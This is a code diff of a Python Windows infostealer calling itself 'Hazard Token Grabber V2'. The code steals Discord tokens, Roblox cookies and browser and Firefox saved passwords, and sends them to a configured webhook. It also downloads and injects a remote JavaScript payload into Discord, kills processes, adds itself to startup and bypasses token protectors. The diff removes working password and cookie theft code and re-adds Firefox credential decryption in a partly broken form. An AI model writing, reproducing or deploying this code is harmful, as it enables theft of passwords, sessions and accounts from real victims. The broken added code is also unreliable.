@@ -1,5 +1,7 @@
 import os
 import re
+import csv
+import sys
 import hmac
 import json
 import httpx
@@ -7,37 +9,39 @@ import winreg
 import ctypes
 import shutil
 import psutil
+import base64
 import asyncio
 import sqlite3
 import zipfile
 import threading
 import subprocess
-
-from sys import argv
+import win32crypt
 from pathlib import Path
 from PIL import ImageGrab
 from struct import unpack
-from base64 import b64decode
 from tempfile import mkdtemp
-from re import findall, match
 from Crypto.Cipher import DES3, AES
 from pyasn1.codec.der import decoder
 from Crypto.Util.Padding import unpad
 from hashlib import sha1, pbkdf2_hmac
 from binascii import hexlify, unhexlify
-from win32crypt import CryptUnprotectData
 from Crypto.Util.number import long_to_bytes
-
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from sys import argv
+from base64 import b64decode
+from re import findall, match
+from win32crypt import CryptUnprotectData
 
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
-    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted 
     'webhook': "WEBHOOK_HERE",
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
+    #ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
-    # set to False if you don't want it to kill programs such as discord upon running the exe
+    # set to False if you don't want it to kill blacklisted programs upon running the exe
+    # If u want discord to be killed then see Line 230
     'kill_processes': True,
     # if you want the file to run at startup
     'startup': True,
@@ -84,13 +88,6 @@ config = {
 Victim = os.getlogin()
 Victim_pc = os.getenv("COMPUTERNAME")
 
-
-class options(object):
-    directory = ''
-    password = ''
-    masterPassword = ''
-
-
 class functions(object):
     @staticmethod
     def getHeaders(token: str = None):
@@ -128,49 +125,6 @@ class functions(object):
     def fetchConf(e: str) -> str or bool | None:
         return config.get(e)
 
-    @staticmethod
-    def findProfiles(name, path):
-        folders = []
-        if name in ["Vivaldi", "Chrome", "Uran", "Yandex", "Brave", "Iridium", "Microsoft Edge"]:
-            folders = [element for element in os.listdir(
-                path) if re.search("^Profile*|^Default$", element) != None]
-        elif os.path.exists(path + '\\_side_profiles'):
-            folders = [element for element in os.listdir(
-                path + '\\_side_profiles')]
-            folders.append('def')
-        return folders
-
-    @staticmethod
-    def getShortLE(d, a):
-        return unpack('<H', (d)[a:a+2])[0]
-
-    @staticmethod
-    def getLongBE(d, a):
-        return unpack('>L', (d)[a:a+4])[0]
-
-    @staticmethod
-    def decryptMoz3DES(globalSalt, masterPassword, entrySalt, encryptedData, options):
-        hp = sha1(globalSalt+masterPassword).digest()
-        pes = entrySalt + b'\x00'*(20-len(entrySalt))
-        chp = sha1(hp+entrySalt).digest()
-        k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
-        tk = hmac.new(chp, pes, sha1).digest()
-        k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
-        k = k1+k2
-        iv = k[-8:]
-        key = k[:24]
-        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)
-
-    @staticmethod
-    def decodeLoginData(data):
-        asn1data = decoder.decode(
-            b64decode(data))
-        key_id = asn1data[0][0].asOctets()
-        iv = asn1data[0][1][1].asOctets()
-        ciphertext = asn1data[0][2].asOctets()
-        return key_id, iv, ciphertext
-
-
 class Hazard_Token_Grabber_V2(functions):
     def __init__(self):
         self.webhook = self.fetchConf('webhook')
@@ -186,32 +140,7 @@ class Hazard_Token_Grabber_V2(functions):
         self.sep = os.sep
         self.tokens = []
         self.robloxcookies = []
-        self.browsers = []
-        self.paths = {
-            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\',
-            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\',
-            'Amigo': self.appdata + '\\Amigo\\User Data\\',
-            'Torch': self.appdata + '\\Torch\\User Data\\',
-            'Kometa': self.appdata + '\\Kometa\\User Data\\',
-            'Orbitum': self.appdata + '\\Orbitum\\User Data\\',
-            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\',
-            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\',
-            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\',
-            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\',
-            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\',
-            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\',
-            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\',
-            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\',
-            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\',
-            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\',
-            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-            'Iridium': self.appdata + '\\Iridium\\User Data\\'
-        }
-        self.CKA_ID = unhexlify('f8000000000000000000000000000001')
+
         os.makedirs(self.dir, exist_ok=True)
 
     def try_extract(func):
@@ -241,7 +170,8 @@ class Hazard_Token_Grabber_V2(functions):
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
         function_list = [self.screenshot, self.grabTokens,
-                         self.grabRobloxCookie, self.grabCookies, self.grabPassword]
+                         self.grabRobloxCookie, self.main,
+                         self.firefoxCookies, self.chCookies, self.chromium_pasw]
         if self.fetchConf('hide_self'):
             function_list.append(self.hide)
 
@@ -250,10 +180,6 @@ class Hazard_Token_Grabber_V2(functions):
 
         if self.fetchConf('startup'):
             function_list.append(self.startup)
-
-        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
-            function_list.append(self.firefoxCookies)
-            function_list.append(self.firefoxPasswords)
 
         for func in function_list:
             process = threading.Thread(target=func, daemon=True)
@@ -293,12 +219,8 @@ class Hazard_Token_Grabber_V2(functions):
                                         inj_path+'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
-                            if "api/webhooks" in self.webhook:
-                                f = httpx.get(self.fetchConf('injection_url')).text.replace(
-                                    "%WEBHOOK%", self.webhook)
-                            else:
-                                f = httpx.get(self.fetchConf('injection_url')).text.replace(
-                                    "%WEBHOOK%", self.webhook).replace("%WEBHOOK_KEY%", self.fetchConf('webhook_protector_key'))
+                            f = httpx.get(self.fetchConf('injection_url')).text.replace(
+                                "%WEBHOOK%", self.webhook)
                             try:
                                 with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                     indexFile.write(f)
@@ -362,7 +284,7 @@ class Hazard_Token_Grabber_V2(functions):
             x = "api/webhooks"
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
-                content = txt.replace(x, 'RdimoTheGoat, damn right')
+                content = txt.replace(x, 'RdimoTheGoat')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
 
@@ -381,11 +303,36 @@ class Hazard_Token_Grabber_V2(functions):
 
     @try_extract
     def grabTokens(self):
-        for name, path in self.paths.items():
+        tokenpaths = {
+            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+        }
+
+        for name, path in tokenpaths.items():
             if not os.path.exists(path):
                 continue
+            disc = name.replace(" ", "").lower()
             if "cord" in path:
-                disc = name.replace(" ", "").lower()
                 if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                     for file_name in os.listdir(path):
                         if file_name[-3:] not in ["log", "ldb"]:
@@ -396,29 +343,12 @@ class Hazard_Token_Grabber_V2(functions):
                                     y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                 asyncio.run(self.checkToken(token))
             else:
-                profiles = self.findProfiles(name, path)
-                if profiles == []:
-                    path = path + 'Local Storage\\leveldb\\'
-                    profiles = [None]
-                for profile in profiles:
-                    if profile == 'def':
-                        path = self.paths[name] + 'Local Storage\\leveldb\\'
-                    elif os.path.exists(self.paths[name] + "_side_profiles\\" + profile + '\\Local Storage\\leveldb\\'):
-                        path = self.paths[name] + "_side_profiles\\" + \
-                            profile + '\\Local Storage\\leveldb\\'
-                    elif profile == None:
-                        pass
-                    else:
-                        path = self.paths[name] + \
-                            f'{profile}\\Local Storage\\leveldb\\'
-                    if not os.path.exists(path):
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
                         continue
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
-                            continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for token in findall(self.regex, line):
-                                asyncio.run(self.checkToken(token))
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in findall(self.regex, line):
+                            asyncio.run(self.checkToken(token))
 
         if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
@@ -428,351 +358,7 @@ class Hazard_Token_Grabber_V2(functions):
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                         for token in findall(self.regex, line):
                             asyncio.run(self.checkToken(token))
-
-    @try_extract
-    def grabPassword(self):
-        for name, path in self.paths.items():
-            localState = path + '\\Local State'
-            if not os.path.exists(localState):
-                continue
-            profiles = self.findProfiles(name, path)
-            if profiles == []:
-                login_db = path + '\\Login Data'
-                profiles = [None]
-            for profile in profiles:
-                localState = path + '\\Local State'
-                if profile == 'def':
-                    login_db = path + '\\Login Data'
-                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Login Data'):
-                    login_db = path + "_side_profiles\\" + profile + '\\Login Data'
-                    localState = path + "_side_profiles\\" + profile + '\\Local State'
-                    if not os.path.exists(localState):
-                        continue
-                elif profile == None:
-                    pass
-                else:
-                    login_db = path + f'{profile}\\Login Data'
-                if not os.path.exists(login_db):
-                    continue
-                with open(self.dir+f"\\{name} Passwords.txt", "a", encoding="cp437", errors='ignore') as f:
-                    master_key = self.get_master_key(localState)
-                    f.write(f"\nProfile: {profile}\n\n")
-                    login = self.dir + self.sep + "Loginvault1.db"
-                    shutil.copy2(login_db, login)
-                    conn = sqlite3.connect(login)
-                    cursor = conn.cursor()
-                    cursor.execute(
-                        "SELECT action_url, username_value, password_value FROM logins")
-                    for r in cursor.fetchall():
-                        url = r[0]
-                        username = r[1]
-                        encrypted_password = r[2]
-                        decrypted_password = self.decrypt_val(
-                            encrypted_password, master_key)
-                        if url != "":
-                            f.write(
-                                f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
-                    cursor.close()
-                    conn.close()
-                    os.remove(login)
-
-    @try_extract
-    def grabCookies(self):
-        for name, path in self.paths.items():
-            localState = path + '\\Local State'
-            if not os.path.exists(localState):
-                continue
-            profiles = self.findProfiles(name, path)
-            if profiles == []:
-                login_db = path + '\\Network\\cookies'
-                profiles = [None]
-            for profile in profiles:
-                localState = path + '\\Local State'
-                if profile == 'def':
-                    login_db = path + '\\Network\\cookies'
-                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Network\\cookies'):
-                    login_db = path + "_side_profiles\\" + profile + '\\Network\\cookies'
-                    localState = path + "_side_profiles\\" + profile + '\\Local State'
-                    if not os.path.exists(localState):
-                        continue
-                elif profile == None:
-                    pass
-                else:
-                    login_db = path + f'{profile}\\Network\\cookies'
-                if not os.path.exists(login_db):
-                    login_db = login_db[:-15] + self.sep + 'cookies'
-                    if not os.path.exists(login_db):
-                        continue
-                with open(self.dir+f"\\{name} Cookies.txt", "a", encoding="cp437", errors='ignore') as f:
-                    master_key = self.get_master_key(localState)
-                    f.write(f"\nProfile: {profile}\n\n")
-                    login = self.dir + self.sep + "Loginvault2.db"
-                    shutil.copy2(login_db, login)
-                    conn = sqlite3.connect(login)
-                    cursor = conn.cursor()
-                    cursor.execute(
-                        "SELECT host_key, name, encrypted_value from cookies")
-                    for r in cursor.fetchall():
-                        host = r[0]
-                        user = r[1]
-                        decrypted_cookie = self.decrypt_val(r[2], master_key)
-                        if host != "":
-                            f.write(
-                                f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-                        if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
-                            self.robloxcookies.append(decrypted_cookie)
-                    cursor.close()
-                    conn.close()
-                    os.remove(login)
-
-    def firefoxCookies(self):
-        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
-        profiles = os.listdir(path)
-        for profile in profiles:
-            cookies = path + os.sep + profile + os.sep + "cookies.sqlite"
-            if not os.path.exists(cookies):
-                continue
-            conn = sqlite3.connect(cookies)
-            cursor = conn.execute("SELECT host, name, value FROM moz_cookies")
-            with open(self.dir + os.sep + f'FirefoxCookies.txt', mode='a', newline='', encoding='utf-8') as f:
-                f.write(f"\nProfile: {profile}\n\n")
-                for r in cursor.fetchall():
-                    host = r[0]
-                    user = r[1]
-                    cookie = r[2]
-                    if host != "":
-                        f.write(
-                            f"Host: {host}\nUser: {user}\nCookie: {cookie}\n\n")
-                cursor.close()
-                conn.close()
-
-    def printASN1(self, d, l, rl):
-        type = d[0]
-        length = d[1]
-        if length & 0x80 > 0:
-            nByteLength = length & 0x7f
-            length = d[2]
-            skip = 1
-        else:
-            skip = 0
-        if type == 0x30:
-            seqLen = length
-            readLen = 0
-            while seqLen > 0:
-                len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)
-                seqLen = seqLen - len2
-                readLen = readLen + len2
-            return length+2
-        elif type == 6:
-            oidVal = hexlify(d[2:2+length])
-            return length+2
-        elif type == 4:
-            return length+2
-        elif type == 5:
-            return length+2
-        elif type == 2:
-            return length+2
-        else:
-            if length == l-2:
-                return length
-
-    def readBsddb(self, name, options):
-        f = open(name, 'rb')
-        header = f.read(4*15)
-        magic = self.getLongBE(header, 0)
-        if magic != 0x61561:
-            return
-        version = self.getLongBE(header, 4)
-        if version != 2:
-            return
-        pagesize = self.getLongBE(header, 12)
-        nkeys = self.getLongBE(header, 0x38)
-
-        readkeys = 0
-        page = 1
-        nval = 0
-        val = 1
-        db1 = []
-        while (readkeys < nkeys):
-            f.seek(pagesize*page)
-            offsets = f.read((nkeys+1) * 4 + 2)
-            offsetVals = []
-            i = 0
-            nval = 0
-            val = 1
-            keys = 0
-            while nval != val:
-                keys += 1
-                key = self.getShortLE(offsets, 2+i)
-                val = self.getShortLE(offsets, 4+i)
-                nval = self.getShortLE(offsets, 8+i)
-                offsetVals.append(key + pagesize*page)
-                offsetVals.append(val + pagesize*page)
-                readkeys += 1
-                i += 4
-            offsetVals.append(pagesize*(page+1))
-            valKey = sorted(offsetVals)
-            for i in range(keys*2):
-                f.seek(valKey[i])
-                data = f.read(valKey[i+1] - valKey[i])
-                db1.append(data)
-            page += 1
-        f.close()
-        db = {}
-
-        for i in range(0, len(db1), 2):
-            db[db1[i+1]] = db1[i]
-        return db
-
-    def getLoginData(self, options):
-        logins = []
-        sqlite_file = options.directory / 'signons.sqlite'
-        json_file = options.directory / 'logins.json'
-        if json_file.exists():  # since Firefox 32, json is used instead of sqlite3
-            loginf = open(json_file, 'r').read()
-            jsonLogins = json.loads(loginf)
-            if 'logins' not in jsonLogins:
-                return []
-            for row in jsonLogins['logins']:
-                encUsername = row['encryptedUsername']
-                encPassword = row['encryptedPassword']
-                logins.append((self.decodeLoginData(encUsername),
-                               self.decodeLoginData(encPassword), row['hostname']))
-            return logins
-        elif sqlite_file.exists():  # firefox < 32
-            conn = sqlite3.connect(sqlite_file)
-            c = conn.cursor()
-            c.execute("SELECT * FROM moz_logins;")
-            for row in c:
-                encUsername = row[6]
-                encPassword = row[7]
-                logins.append((self.decodeLoginData(encUsername),
-                               self.decodeLoginData(encPassword), row[1]))
-            return logins
-
-    def extractSecretKey(self, masterPassword, keyData, options):
-        pwdCheck = keyData[b'password-check']
-        entrySaltLen = pwdCheck[1]
-        entrySalt = pwdCheck[3: 3+entrySaltLen]
-        encryptedPasswd = pwdCheck[-16:]
-        globalSalt = keyData[b'global-salt']
-        cleartextData = self.decryptMoz3DES(
-            globalSalt, masterPassword, entrySalt, encryptedPasswd, options)
-        if cleartextData != b'password-check\x02\x02':
-            return
-
-        if self.CKA_ID not in keyData:
-            return None
-        privKeyEntry = keyData[self.CKA_ID]
-        saltLen = privKeyEntry[1]
-        nameLen = privKeyEntry[2]
-        privKeyEntryASN1 = decoder.decode(privKeyEntry[3+saltLen+nameLen:])
-        data = privKeyEntry[3+saltLen+nameLen:]
-        self.printASN1(data, len(data), 0)
-        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
-        privKeyData = privKeyEntryASN1[0][1].asOctets()
-        privKey = self.decryptMoz3DES(
-            globalSalt, masterPassword, entrySalt, privKeyData, options)
-        self.printASN1(privKey, len(privKey), 0)
-        privKeyASN1 = decoder.decode(privKey)
-        prKey = privKeyASN1[0][2].asOctets()
-        self.printASN1(prKey, len(prKey), 0)
-        prKeyASN1 = decoder.decode(prKey)
-        id = prKeyASN1[0][1]
-        key = long_to_bytes(prKeyASN1[0][3])
-        return key
-
-    def decryptPBE(self, decodedItem, masterPassword, globalSalt, options):
-        pbeAlgo = str(decodedItem[0][0][0])
-        if pbeAlgo == '1.2.840.113549.1.12.5.1.3':
-            entrySalt = decodedItem[0][0][1][0].asOctets()
-            cipherT = decodedItem[0][1].asOctets()
-            key = self.decryptMoz3DES(
-                globalSalt, masterPassword, entrySalt, cipherT, options)
-            return key[:24], pbeAlgo
-        elif pbeAlgo == '1.2.840.113549.1.5.13':
-            assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
-            assert str(decodedItem[0][0][1][0][1][3]
-                       [0]) == '1.2.840.113549.2.9'
-            assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
-            entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
-            iterationCount = int(decodedItem[0][0][1][0][1][1])
-            keyLength = int(decodedItem[0][0][1][0][1][2])
-            assert keyLength == 32
-
-            k = sha1(globalSalt+masterPassword).digest()
-            key = pbkdf2_hmac('sha256', k, entrySalt,
-                              iterationCount, dklen=keyLength)
-
-            iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
-            cipherT = decodedItem[0][1].asOctets()
-            clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
-
-            return clearText, pbeAlgo
-
-    def getKey(self, masterPassword, directory, options):
-        if (directory / 'key4.db').exists():
-            # firefox 58.0.2 / NSS 3.35 with key4.db in SQLite
-            conn = sqlite3.connect(directory / 'key4.db')
-            c = conn.cursor()
-            # first check password
-            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
-            row = c.fetchone()
-            globalSalt = row[0]  # item1
-            item2 = row[1]
-            self.printASN1(item2, len(item2), 0)
-            decodedItem2 = decoder.decode(item2)
-            clearText, algo = self.decryptPBE(
-                decodedItem2, masterPassword, globalSalt, options)
-
-            if clearText == b'password-check\x02\x02':
-                c.execute("SELECT a11,a102 FROM nssPrivate;")
-                for row in c:
-                    if row[0] != None:
-                        break
-                a11 = row[0]
-                a102 = row[1]
-                if a102 == self.CKA_ID:
-                    self.printASN1(a11, len(a11), 0)
-                    decoded_a11 = decoder.decode(a11)
-                    clearText, algo = self.decryptPBE(
-                        decoded_a11, masterPassword, globalSalt, options)
-                    return clearText[:24], algo
-            return None, None
-        elif (directory / 'key3.db').exists():
-            keyData = self.readBsddb(directory / 'key3.db', options)
-            key = self.extractSecretKey(masterPassword, keyData)
-            return key, '1.2.840.113549.1.12.5.1.3'
-        return None, None
-
-    def firefoxPasswords(self):
-        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
-        profiles = os.listdir(path)
-        for profile in profiles:
-            direct = Path(path + self.sep + profile + self.sep)
-            options.directory = direct
-            key, algo = self.getKey(options.masterPassword.encode(),
-                                    options.directory, options)
-            if key == None:
-                continue
-            logins = self.getLoginData(options)
-            if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':
-                with open(self.dir + os.sep + f'Firefox passwords.txt', mode='a', newline='', encoding='utf-8') as f:
-                    f.write(f"\nProfile: {profile}\n\n")
-                    for i in logins:
-                        assert i[0][0] == self.CKA_ID
-                        url = '%20s:' % (i[2])  # site URL
-                        iv = i[0][1]
-                        ciphertext = i[0][2]
-                        name = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
-                            ciphertext), 8), encoding="utf-8")
-                        iv = i[1][1]
-                        ciphertext = i[1][2]
-                        passw = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
-                            ciphertext), 8), encoding="utf-8")
-                        f.write(
-                            f"Domain: {url}\nUser: {name}\nPass: {passw}\n\n")
-
+                            
     def neatifyTokens(self):
         f = open(self.dir+"\\Discord Info.txt",
                  "w", encoding="cp437", errors='ignore')
@@ -835,6 +421,460 @@ class Hazard_Token_Grabber_V2(functions):
             with open(self.dir+"\\Roblox Cookies.txt", "w") as f:
                 for i in self.robloxcookies:
                     f.write(i+'\n')
+    def getShortLE(d, a):
+        return unpack('<H', (d)[a:a+2])[0]
+
+    def getLongBE(d, a):
+        return unpack('>L', (d)[a:a+4])[0]
+
+    def printASN1(self, d, l, rl):
+        type = d[0]
+        length = d[1]
+        if length & 0x80 > 0:
+            length = d[2]
+            skip = 1
+        else:
+            skip = 0
+        if type == 0x30:
+            seqLen = length
+            readLen = 0
+            while seqLen > 0:
+                len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)
+                seqLen = seqLen - len2
+                readLen = readLen + len2
+            return length+2
+        elif type == 6:
+            return length+2
+        elif type == 4:
+            return length+2
+        elif type == 5:
+            return length+2
+        elif type == 2:
+            return length+2
+        else:
+            if length == l-2:
+                return length
+
+    def readBsddb(self, name, options):
+        f = open(name, 'rb')
+        header = f.read(4*15)
+        magic = self.getLongBE(header, 0)
+        if magic != 0x61561:
+            print('bad magic number')
+            sys.exit()
+        version = self.getLongBE(header, 4)
+        if version != 2:
+            print('bad version, !=2 (1.85)')
+            sys.exit()
+        pagesize = self.getLongBE(header, 12)
+        nkeys = self.getLongBE(header, 0x38)
+        if options.verbose > 1:
+            print('pagesize=0x%x' % pagesize)
+            print('nkeys=%d' % nkeys)
+
+        readkeys = 0
+        page = 1
+        nval = 0
+        val = 1
+        db1 = []
+        while (readkeys < nkeys):
+            f.seek(pagesize*page)
+            offsets = f.read((nkeys+1) * 4 + 2)
+            offsetVals = []
+            i = 0
+            nval = 0
+            val = 1
+            keys = 0
+            while nval != val:
+                keys += 1
+                key = self.getShortLE(offsets, 2+i)
+                val = self.getShortLE(offsets, 4+i)
+                nval = self.getShortLE(offsets, 8+i)
+                offsetVals.append(key + pagesize*page)
+                offsetVals.append(val + pagesize*page)
+                readkeys += 1
+                i += 4
+            offsetVals.append(pagesize*(page+1))
+            valKey = sorted(offsetVals)
+            for i in range(keys*2):
+                f.seek(valKey[i])
+                data = f.read(valKey[i+1] - valKey[i])
+                db1.append(data)
+            page += 1
+        f.close()
+        db = {}
+
+        for i in range(0, len(db1), 2):
+            db[db1[i+1]] = db1[i]
+        if options.verbose > 1:
+            for i in db:
+                print('%s: %s' % (repr(i), hexlify(db[i])))
+        return db
+
+    def decryptMoz3DES(globalSalt,  entrySalt, encryptedData, options):
+        hp = sha1(globalSalt).digest()
+        pes = entrySalt + b'\x00'*(20-len(entrySalt))
+        chp = sha1(hp+entrySalt).digest()
+        k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
+        tk = hmac.new(chp, pes, sha1).digest()
+        k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
+        k = k1+k2
+        iv = k[-8:]
+        key = k[:24]
+        if options.verbose > 0:
+            print('key= %s, iv=%s' % (hexlify(key), hexlify(iv)))
+        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)
+
+    def decodeLoginData(self, data):
+        asn1data = decoder.decode(
+            base64.b64decode(data))
+        key_id = asn1data[0][0].asOctets()
+        iv = asn1data[0][1][1].asOctets()
+        ciphertext = asn1data[0][2].asOctets()
+        return key_id, iv, ciphertext
+
+    def getLoginData(self, options):
+        logins = []
+        sqlite_file = options['directory'] / 'signons.sqlite'
+        json_file = options['directory'] / 'logins.json'
+        if json_file.exists():
+            loginf = open(json_file, 'r').read()
+            jsonLogins = json.loads(loginf)
+            if 'logins' not in jsonLogins:
+                print('error: no \'logins\' key in logins.json')
+                return []
+            for row in jsonLogins['logins']:
+                encUsername = row['encryptedUsername']
+                encPassword = row['encryptedPassword']
+                logins.append((self.decodeLoginData(encUsername),
+                               self.decodeLoginData(encPassword), row['hostname']))
+            return logins
+        elif sqlite_file.exists():
+            print('sqlite')
+            conn = sqlite3.connect(sqlite_file)
+            c = conn.cursor()
+            c.execute("SELECT * FROM moz_logins;")
+            for row in c:
+                encUsername = row[6]
+                encPassword = row[7]
+                if options['verbose'] > 1:
+                    print(row[1], encUsername, encPassword)
+                logins.append((self.decodeLoginData(encUsername),
+                               self.decodeLoginData(encPassword), row[1]))
+            return logins
+        else:
+            print('missing logins.json or signons.sqlite')
+
+    CKA_ID = unhexlify('f8000000000000000000000000000001')
+
+    def extractSecretKey(self,  keyData, options):
+        pwdCheck = keyData[b'password-check']
+        entrySaltLen = pwdCheck[1]
+        entrySalt = pwdCheck[3: 3+entrySaltLen]
+        encryptedPasswd = pwdCheck[-16:]
+        globalSalt = keyData[b'global-salt']
+        cleartextData = self.decryptMoz3DES(
+            globalSalt,  entrySalt, encryptedPasswd, options)
+        if cleartextData != b'password-check\x02\x02':
+            print(
+                'password check error, Master Password is certainly used, please provide it with -p option')
+            sys.exit()
+
+        if self.CKA_ID not in keyData:
+            return None
+        privKeyEntry = keyData[self.CKA_ID]
+        saltLen = privKeyEntry[1]
+        nameLen = privKeyEntry[2]
+        privKeyEntryASN1 = decoder.decode(privKeyEntry[3+saltLen+nameLen:])
+        data = privKeyEntry[3+saltLen+nameLen:]
+        self.printASN1(data, len(data), 0)
+
+        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
+        privKeyData = privKeyEntryASN1[0][1].asOctets()
+        privKey = self.decryptMoz3DES(
+            globalSalt,  entrySalt, privKeyData, options)
+
+        self.printASN1(privKey, len(privKey), 0)
+
+        privKeyASN1 = decoder.decode(privKey)
+        prKey = privKeyASN1[0][2].asOctets()
+        print('decoding %s' % hexlify(prKey))
+        self.printASN1(prKey, len(prKey), 0)
+
+        prKeyASN1 = decoder.decode(prKey)
+        id = prKeyASN1[0][1]
+        key = long_to_bytes(prKeyASN1[0][3])
+        if options.verbose > 0:
+            print('key=%s' % (hexlify(key)))
+        return key
+
+    def decryptPBE(self, decodedItem,  globalSalt, options):
+        pbeAlgo = str(decodedItem[0][0][0])
+        if pbeAlgo == '1.2.840.113549.1.12.5.1.3':
+
+            entrySalt = decodedItem[0][0][1][0].asOctets()
+            cipherT = decodedItem[0][1].asOctets()
+            print('entrySalt:', hexlify(entrySalt))
+            key = self.decryptMoz3DES(
+                globalSalt,  entrySalt, cipherT, options)
